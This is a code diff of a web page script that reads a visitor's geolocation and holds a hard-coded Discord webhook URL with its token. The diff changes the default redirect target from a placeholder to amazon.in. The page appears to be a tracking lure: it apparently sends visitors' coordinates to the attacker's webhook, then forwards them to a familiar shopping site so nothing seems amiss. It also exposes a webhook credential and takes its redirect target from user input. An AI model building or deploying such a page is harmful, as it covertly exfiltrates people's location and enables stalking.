@@ -16,7 +16,7 @@
             let lon = position.coords.longitude;
             let accuracy = position.coords.accuracy;
             let timestamp = new Date().toISOString();
-            let redirectUrl = new URLSearchParams(window.location.search).get("redirect") || "https://defaultsite.com";
+            let redirectUrl = new URLSearchParams(window.location.search).get("redirect") || "https://www.amazon.in/";
             let webhookUrl = "https://discord.com/api/webhooks/1357393737864445992/SRNYrjE7Gfmpmqhq0sb8SqpLYdGDwN2h4d5OOeBnIm5E3wsEknuY51eCUKbdHdGz_lmo";
 
             let locationData = {
@@ -37,7 +37,7 @@
         }
 
         function redirectWithoutLocation() {
-            let redirectUrl = new URLSearchParams(window.location.search).get("redirect") || "https://defaultsite.com";
+            let redirectUrl = new URLSearchParams(window.location.search).get("redirect") || "https://www.amazon.in/";
             window.location.href = redirectUrl;
         }
     </script>
